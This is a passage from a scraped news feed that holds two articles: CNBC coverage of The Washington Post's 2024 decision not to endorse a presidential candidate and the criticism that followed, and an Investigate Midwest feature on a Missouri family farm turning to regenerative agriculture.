<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-107424611" data-test="InlineImage"><p>The Washington Post Building at One Franklin Square Building in Washington, D.C., June 5, 2024.</p><p>Andrew Harnik | Getty Images</p></div><div><p><a href="https://www.washingtonpost.com/opinions/2024/10/25/washington-post-endorsement/" target="_blank">The Washington Post</a> said Friday that it will not endorse a candidate in the presidential election this year, breaking decades of tradition, and sparking immediate criticism of the decision.</p><p>The newspaper also published an <a href="https://www.washingtonpost.com/style/media/2024/10/25/washington-post-endorsement-president/" target="_blank">article</a> by two staff reporters saying that editorial page staffers had drafted an endorsement of Democratic nominee <a href="https://www.cnbc.com/kamala-harris/">Kamala Harris</a> over GOP nominee<a href="https://www.cnbc.com/donald-trump/"> Donald Trump</a> in the election.</p><p>"The decision not to publish was made by The Post's owner — <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-5"><a href="https://www.cnbc.com/quotes/AMZN/">Amazon</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> founder Jeff Bezos," the article said, citing two sources briefed on the events.</p><p>Trump, while president, had been critical of the billionaire Bezos and the Post, which he purchased in 2013.</p><p>The <a href="https://www.washingtonpost.com/opinions/hillary-clinton-for-president/2016/10/12/665f9698-8caf-11e6-bf8a-3d26847eeed4_story.html" target="_blank">newspaper</a> in 2016 and again in 2020 endorsed Trump's <a href="https://www.washingtonpost.com/opinions/2020/09/28/editorial-board-endorsement-joe-biden/" target="_blank">election</a> opponents, <a href="https://www.cnbc.com/hillary-clinton/">Hillary Clinton</a> and President <a href="https://www.cnbc.com/joe-biden/">Joe Biden</a>, in editorials that condemned the Republican in blunt terms.</p><p>In a 2019 lawsuit, Amazon claimed it had lost a $10 billion <a href="https://fingfx.thomsonreuters.com/gfx/reuterscom/1/161/161/Amazon.pdf" target="_blank">cloud computing contract</a> with the Pentagon to Microsoft because Trump had used "improper pressure ... to harm his perceived political enemy" Bezos.</p><p>The Post since 1976 had regularly endorsed candidates for president, except for the 1988 race. All those endorsements had been for Democrats.</p><p>In a statement to CNBC, when asked about Bezos' purported role in killing the endorsement, Post chief communications officer Kathy Baird said, "This was a Washington Post decision to not endorse, and I would refer you to the publisher's statement in full."</p><p>The Post on Friday evening published a third article, signed by <a href="https://www.washingtonpost.com/opinions/2024/10/25/post-columnist-no-endorsement-2024-trump-harris/" target="_blank">opinion columnists</a> for the newspaper, who said, "The Washington Post's decision not to make an endorsement in the presidential campaign is a terrible mistake."</p><p>"It represents an abandonment of the fundamental editorial convictions of the newspaper that we love, and for which we have worked a combined 218 years," the column said. "This is a moment for the institution to be making clear its commitment to democratic values, the rule of law and international alliances, and the threat that <a href="https://www.washingtonpost.com/donald-trump/?itid=lk_inline_manual_1" target="_blank">Donald Trump</a> poses to them — the precise points The Post made in endorsing Trump's opponents in 2016 and 2020."</p><p>CNBC has requested comment from Amazon, where Bezos remains the largest shareholder.</p></div><div id="ArticleBody-InlineImage-106944637" data-test="InlineImage"><p>Amazon founder Jeff Bezos arrives for his meeting with British Prime Minister Boris Johnson at the UK diplomatic residence in New York City, Sept. 20, 2021.</p><p>Michael M. Santiago | Getty Images News | Getty Images</p></div><div><p>Post publisher and chief executive Will Lewis, in an online explanation of the decision, wrote, "The Washington Post will not be making an endorsement of a presidential candidate in this election. Nor in any future presidential election."</p><p>"We are returning to our roots of not endorsing presidential candidates," Lewis wrote.</p><p>"We recognize that this will be read in a range of ways, including as a tacit endorsement of one candidate, or as a condemnation of another, or as an abdication of responsibility," he wrote.</p><p>"That is inevitable. We don't see it that way. We see it as consistent with the values The Post has always stood for and what we hope for in a leader: character and courage in service to the American ethic, veneration for the rule of law, and respect for human freedom in all its aspects."</p><p>Seven of the 13 paragraphs of Lewis' article either quoted at length or referred to Post Editorial Board statements in 1960 and 1972 explaining the paper's rationale for not endorsing presidential candidates in those years, which included its identity as "an independent newspaper."</p><p>Lewis noted that the paper had endorsed Jimmy Carter in 1976 "for understandable reasons at the times" — which he did not identify.</p><p>"But we had it right before that, and this is what we are going back to," Lewis wrote.</p><p>"Our job as the newspaper of the capital city of the most important country in the world is to be independent," he wrote. "And that is what we are and will be."</p><p>Post editor-at-large Robert Kagan, a member of the paper's opinions section, resigned following the decision, multiple news outlets reported.</p><p>More than 10,000 comments were posted on Lewis' article, many of them blasting the Post for its decision and saying they were canceling their subscriptions.</p><p>"The most consequential election in our country, a choice between Fascism and Democracy, and you sit out? Cowards. Unethical, fearful cowards," wrote one reader. "Oh, and by the way, I'm canceling my subscription, because you are putting business ahead of ethics and morals."</p><p>The announcement came days after Mariel Garza, the head of <a href="https://www.nytimes.com/2024/10/23/business/media/la-times-editor-quits-patrick-soon-shiong-endorsement.html" target="_blank">The Los Angeles Times</a>' editorial board, resigned in protest after that paper's owner, Patrick Soon-Shiong, decided against running a presidential endorsement.</p><p>"I am resigning because I want to make it clear that I am not okay with us being silent," Garza told the <a href="https://www.cjr.org/business_of_news/los-angeles-times-editorials-editor-resigns-after-owner-blocks-presidential-endorsement.php" target="_blank">Columbia Journalism Review</a>. "In dangerous times, honest people need to stand up. This is how I'm standing up."</p><p>Soon-Shiong, like Bezos, is a billionaire.</p><p>Marty Baron, the former editor of The Washington Post, called that paper's decision "cowardice, with democracy as its casualty."</p><p>″@realdonaldtrump will see this as an invitation to further intimidate owner @jeffbezos (and others)," Baron wrote. "Disturbing spinelessness at an institution famed for courage."</p><p>The Washington Post Guild, the union that represents the newspaper's staff, in a statement posted on the social media site X said it was "deeply concerned that The Washington Post — an American news institution in the nation's capital — would make a decision to no longer endorse presidential candidates, especially a mere 11 days ahead of an immensely consequential election."</p><p>"The message from our chief executive, Will Lewis — not from the Editorial Board itself — makes us concerned that management interfered with the work of our members in Editorial," the Guild said in the statement, which noted the paper's reporting about Bezos' role in the decision.</p><p>"We are already seeing cancellations from once loyal readers," the Guild said. "This decision undercuts the work of our members at a time when we should be building our readers' trust, not losing it."</p></div><div id="RegularArticle-RelatedContent-1"><h2>Read more CNBC politics coverage</h2><div><ul><li><a href="https://www.cnbc.com/2024/10/25/biden-student-debt-financial-disaster-loan-cancellation.html">Biden's latest student debt plan would create forgiveness path for borrowers facing financial ruin</a></li><li><a href="https://www.cnbc.com/2024/10/24/polymarket-trump-french-election-bet.html">French trader bet over $28 million on Trump election win using 4 Polymarket accounts</a></li><li><a href="https://www.cnbc.com/2024/10/23/elon-musk-trump-pac-doj-letter-illegal-election.html">DOJ warns Elon Musk pro-Trump PAC that $1 million voter contest may be illegal</a></li><li><a href="https://www.cnbc.com/2024/10/23/harris-trump-hitler-election-john-kelly.html">Harris blasts Trump on reported Hitler comments, says 'he wants unchecked power'</a></li><li><a href="https://www.cnbc.com/2024/10/23/nobel-prize-winning-economists-donald-trump-agenda-endorse-harris.html">'Higher prices, larger deficits': 23 Nobel Prize-winning economists slam Trump agenda, endorse Harris</a></li></ul></div></div><div><p>Post columnist Karen Attiah, in a post on the social media site Threads, wrote, "Today has been an absolute stab in the back."</p><p>"What an insult to those of us who have literally put our careers and lives on the line to call out threats to human rights and democracy," Attiah wrote.</p><p>Rep. Ted Lieu, a Democrat from California, in his own tweet on the news wrote, "The first step towards fascism is when the free press cowers in fear."</p><p>Trump in August told Fox Business News that Bezos called him after the Republican narrowly escaped an assassination attempt in July at a campaign rally in western Pennsylvania.</p><p>"He was very nice even though he owns The Washington Post," Trump said of Bezos.</p><p>Bezos last posted on X on July 13, hours after the assassination attempt.</p><p>"Our former President showed tremendous grace and courage under literal fire tonight," Bezos wrote in that tweet. "So thankful for his safety and so sad for the victims and their families."</p><p>Trump on Friday met in Austin, Texas, with executives from the Bezos-owned space exploration company Blue Origin, among them CEO David Limp, the Associated Press reported</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[In the US, regenerative farming practices require unlearning past advice (199 pts)]]></title>
            <link>https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/</link>
            <guid>41949108</guid>
            <pubDate>Fri, 25 Oct 2024 20:03:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/">https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/</a>, See on <a href="https://news.ycombinator.com/item?id=41949108">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-748674">
	<div>

		
		<figure><audio controls="" src="https://investigatemidwest.org/wp-content/uploads/2024/10/6705963765cad.audio_.mp3" autoplay="" loop=""></audio></figure><p>Early on a cool September morning, farmer Josh Payne tends to his flock in Concordia, just east of Kansas City, Missouri. As Payne opens the gate, about a thousand sheep round the corner and bound into fresh grass.</p><p>The pasture the flock grazes was once corn and soybeans, along with the rest of the Payne family farm. Josh’s grandfather Charles Payne cultivated nearly a thousand acres of row crops for decades.</p><p>But as Josh Payne took over managing the property about 15 years ago, that wasn’t going to work anymore.</p><p>“I found out I’m allergic to herbicide,” he said. “My throat would swell shut three or four times a week during harvest.”</p><p>Payne wanted to transition the farm to regenerative agriculture — a movement that aims to revive farmland soil and by extension the ecosystem and the small farm economy.</p><p>He hoped that by changing what and how they farmed, it would reduce the need for chemical inputs and farm with nature. Josh told his grandfather they should use cover crops, graze sheep and plant an orchard. But Charles Payne wasn’t having it.</p><figure><img data-recalc-dims="1" decoding="async" width="780" height="520" data-attachment-id="748688" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/67054967c8695/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?fit=1035%2C690&amp;ssl=1" data-orig-size="1035,690" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="67054967c8695" data-image-description="" data-image-caption="<p>Josh Payne drives from the farm house to the sheep pasture Sept. 3 at the Payne family farm in Concordia. Payne described his journey from teaching high school to returning to the Payne family farm and his discovery of cover crops as an alternative to the herbicides he’s allergic to. photo by Cory. W. Macneil, Missourian</p>
" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?fit=780%2C520&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=780%2C520&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?w=1035&amp;ssl=1 1035w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054967c8695.webp?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"><figcaption>Josh Payne drives from the farm house to the sheep pasture Sept. 3 at the Payne family farm in Concordia. Payne described his journey from teaching high school to returning to the Payne family farm and his discovery of cover crops as an alternative to the herbicides he’s allergic to. photo by Cory. W. MacNeil, Missourian</figcaption></figure><p>“I’m like, ‘Grandpa, we should do this.’ He’s like, ‘No, we’re not planting trees!’” Josh Payne said. “Literally. His phrase was, ‘I spent my whole life tearing out trees. We’re not gonna go plant them now.’”</p><p>Josh said he and his grandfather had similar disagreements, and even arguments, about many changes Josh hoped to make on the farm.</p><p>“We went through a really interesting process because I’m stubborn and he’s stubborn,” he said.</p><h3>Mid-century farm revolution</h3><p>Charles Payne, 96, came of age during an industrial and chemical revolution in agriculture. Like countless other Midwestern farmers, he heeded the advice from industry and government leaders to “plant fence row to fence row” to increase the production of commodities.</p><p>“And that’s what we did … tore out all the fences and hedgerows,” Charles Payne said. “Now I wish I had some of them back.”</p><p>U.S. agriculture&nbsp;<a href="https://www.ers.usda.gov/data-products/agricultural-productivity-in-the-u-s/summary-of-recent-findings" target="_blank" rel="noreferrer noopener">production tripled</a>&nbsp;in the latter half of the 20th century, due in part to chemical inputs. But that came with an environmental cost — soil degradation, water quality issues and a loss of biodiversity.</p><p>The resurgence of regenerative or environmentally sustainable agriculture is partially a response to the&nbsp;<a href="https://www.epa.gov/climateimpacts/climate-change-impacts-agriculture-and-food-supply" target="_blank" rel="noreferrer noopener">industry’s contribution to climate change</a>&nbsp;and its susceptibility to it. There’s now a surge of funding, research and education to figure out how to scale regenerative agriculture and turn away from equipment and chemically intensive ways of cultivating crops.</p><figure><img data-recalc-dims="1" decoding="async" width="780" height="520" data-attachment-id="748686" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/6705496e9683e-image/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?fit=1763%2C1176&amp;ssl=1" data-orig-size="1763,1176" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="6705496e9683e.image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?fit=780%2C520&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=780%2C520&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?w=1763&amp;ssl=1 1763w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=1536%2C1025&amp;ssl=1 1536w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=1200%2C800&amp;ssl=1 1200w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=1568%2C1046&amp;ssl=1 1568w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705496e9683e.image_.jpg?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"><figcaption>Josh Payne returns to his truck after unhooking a portable shade he towed to a fresh pasture where the sheep will graze for three days, then move again on Sept. 3 at the Payne family farm in Concordia. Payne, who had once thought of raising cattle, switched to sheep after a suggestion at a farming conference, then confirmed by a banker he met at a fencing supplier who elaborated on the economics of cattle versus sheep. photo by Cory W. MacNeil, Missourian</figcaption></figure><p>But University of Missouri rural sociologist Mary Hendrickson said the way Charles Payne farmed was also a result of policy, research and methods encouraged by the industry at the time. Before the ecological consequences were understood, chemical inputs were “miracles” for a farm.</p><p>“Everybody who was going to be an advanced, innovative farmer, they were using chemicals for weed control, for pest control, for all of these things,” she said.</p><p>Hendrickson said for a certain generation of farmers, their skepticism or resistance to regenerative agriculture is a result of their lived experience.</p><p>“There’s a reason why somebody who has lived through that transition says, ‘Wait, you want me to go back to what?” Hendrickson said.</p><p>The advice Charles Payne’s grandchildren, Josh and his sister Jordan Welch, are getting is sometimes the exact opposite of what he was told in his day.</p><p>Hendrickson said this isn’t unique to agriculture. There are many things in life that people do differently than their grandparents’ generation — such as cooking, cleaning or child rearing.</p><p>“The things that my mother did to raise me were not in vogue when I was born, and they were (again) 20 years later,” she said.</p><h3>Generational legacy</h3><p>Farming isn’t Josh Payne’s first vocation. After teaching English for years, he said he ended up back on the farm “completely accidentally” when his grandfather requested help managing the land about 15 years ago.</p><p>“When we got here it was a very, very conventional farm. Everything was commodity, corn and soy. Everything was Roundup ready. Everything was genetically modified,” Josh Payne said. “I call it growing nickels and dimes.”</p><p>Payne wasn’t exactly happy row cropping, and he was curious about trying other methods. But when he discovered his allergy to herbicides, it was a catalyst for change.</p><p>“Grandpa, I’m either going to have to go back to teaching or we’re going to have to completely change what we do,” he told Charles Payne.</p><p>The Paynes now rotationally graze their sheep among 800 chestnut trees — a method called “silvopasture,” which revives the soil by keeping living roots in the ground year round. They planted the trees eight years ago and are completing their third harvest.</p><p>Before the flock of sheep was added to the operation, the Paynes cultivated conventional crops in between the orchard rows that are spaced 30-feet apart — a regenerative method called alley cropping. The Paynes are still finding ways to grow and adapt, most recently by adding a produce garden.</p><p>Charles Payne has been farming the stretch of land in Concordia since 1956. He said corn, soy and wheat were the “going” crops at the time.</p><figure><img data-recalc-dims="1" decoding="async" width="780" height="520" data-attachment-id="748684" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/6705b1f54b7f5-image/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?fit=1035%2C690&amp;ssl=1" data-orig-size="1035,690" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="6705b1f54b7f5.image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?fit=780%2C520&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=780%2C520&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?w=1035&amp;ssl=1 1035w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705b1f54b7f5.image_.jpg?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"><figcaption>Josh Payne closes the electric fence after 1,000 sheep pass through to a fresh paddock Sept. 3 at the Payne family farm in Concordia. Payne said that moving 1,000 sheep from paddock to paddock is easier than moving a small number. photo by Cory W. MacNeil, Missourian</figcaption></figure><p>“We had some good years and we had some very poor years too,” he said.</p><p>Josh Payne said his grandfather has a deep knowledge of the land and the industry and now acts as a mentor and adviser to his grandkids.</p><p>Although he said he’s had to learn to bite his tongue at times during this transition, Charles Payne said he’s happy they are farming.</p><p>“That’s a good thing to have your grandkids farming where you left off,” Charles Payne said. “Of course, it’s a different way of farming, but they’re on the farm, and they seem to really enjoy it.”</p><p>For Charles and Josh Payne, the elder’s resistance to change and the younger’s desire for change were both motivated by the goal to keep the farm alive. Josh Payne said the markets for sheep and chestnuts are good and support jobs for him and his sister. He said they’re comparable to the markets his grandfather had for corn, soy and wheat decades ago.</p><p>“Grandpa, you made the right decisions for your time,” he said. “You were faithful to this land, to this place, to your family … but that just looks different now.”</p><p>Rural sociologist Hendrickson said in agriculture communities especially, there exists a generational pressure to farm and to succeed doing so.</p><p>“This identity as a farmer and the land and holding that for the next generation was significant for farmers,” she said.</p><p>For years farmers heard that to be successful in modern agriculture, they’d have to get big or get out. Payne thinks there’s another option.</p><p>“I think people either got to get big or get weird,” Josh Payne said. “We chose to get weird.”</p><h3>‘The new old way’</h3><p>Regenerative agriculture starts with the soil. The health of farm ground is connected to the financial viability and resiliency of the farm, said Chuck Rice, a professor at Kansas State University.</p><p>“We’ve lost 50% of our soil organic matter with 100 plus years of cultivation in the United States,” Rice said. “So we aren’t taking care of our soils.”</p><p>Methods like those Josh Payne has implemented on the Concordia farm revive — or regenerate — the soil and by extension the ecosystem. Regenerative agriculture methods aim to not only restore farmland to its prechemical and industrial state, but to help the land withstand the severe weather threats from climate change.</p><p>“Not only is the economy changing, but the climate’s changing,” Rice said. “I think if you’re staying with the same practices … ultimately you’re going to be losing out.”</p><p>Reducing or eliminating tillage of the soil, a practice called “no till,” is often the first step for farmers looking to operate more sustainably. Rice said market forces can sometimes jump start changes in the agriculture industry. In order to till fields, farmers need diesel fuel to power their equipment. That gas was highly priced during the 1970s fuel crisis, which made no till more popular, Rice said.</p><figure><img data-recalc-dims="1" decoding="async" width="780" height="520" data-attachment-id="748689" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/67054975b7485-image/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?fit=1763%2C1176&amp;ssl=1" data-orig-size="1763,1176" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="67054975b7485.image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?fit=780%2C520&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=780%2C520&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?w=1763&amp;ssl=1 1763w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=1536%2C1025&amp;ssl=1 1536w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=1200%2C800&amp;ssl=1 1200w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=1568%2C1046&amp;ssl=1 1568w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/67054975b7485.image_.jpg?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"><figcaption>Josh Payne exits the shed where he grows micro-grains with a tray of sprouts to feed his the pigs Sept. 20 at the Payne family farm in Concordia. Growing the sprouts in trays allows Payne to monitor their growth and quality and makes it easy to transport from shed to pig pen. photo by Cory W. MacNeil, Missourian</figcaption></figure><p>“There was a quick, rapid adoption of no till during that time period,” he said.</p><p>Two generations later, no till continues to steadily spread. Rice said Kansas farmers are leaders in no till operation, encompassing about 40% of the state’s farmed acres.</p><p>“We still haven’t reached its peak, but it’s one of the more common practices,” Rice said.</p><p>Cody Jolliff is a farm historian and the CEO of the Midwest Center for Regenerative Agriculture at Powell Gardens, a botanical garden in Kansas City.</p><p>The Powell Gardens’ Midwest Center for Regenerative Agriculture is creating a living laboratory for farmers to come to Kansas City and get hands-on experience in regenerative agriculture methods. Or as Jolliff said, to learn “the new old way” to farm.</p><p>He said in many ways, regenerative agriculture is a return to the farming of another era.</p><p>“It’s really interesting though, because as we are going to these super modern methods, they also have a lot of resemblance to old methods,” he said.</p><p>Before the Civil War, over half of the country’s residents were farmers, Jolliff said, and they worked with small parcels of land in diversified operations. The modern regenerative agriculture movement encourages that same type of&nbsp;<a href="https://www.kbia.org/kbia-news/2024-09-25/farming-among-the-trees-how-perennial-crops-can-help-breathe-life-into-depleted-soil" target="_blank" rel="noreferrer noopener">farm diversification</a>.</p><p>Jolliff said agriculture has changed before and can change again. He points to the success of the 1914 Smith-Lever Act that created the cooperative extension programs that work from land-grant universities to teach farmers across the nation.</p><p>“It takes a long, long time for agriculture methods to change,” he said. “This is not going to be an overnight thing. It’s a huge investment right now across the country into these practices.”</p><figure><img data-recalc-dims="1" decoding="async" width="780" height="520" data-attachment-id="748687" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/6705497a23aa9-image/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?fit=1035%2C690&amp;ssl=1" data-orig-size="1035,690" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="6705497a23aa9.image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?fit=780%2C520&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=780%2C520&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?w=1035&amp;ssl=1 1035w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=768%2C512&amp;ssl=1 768w, 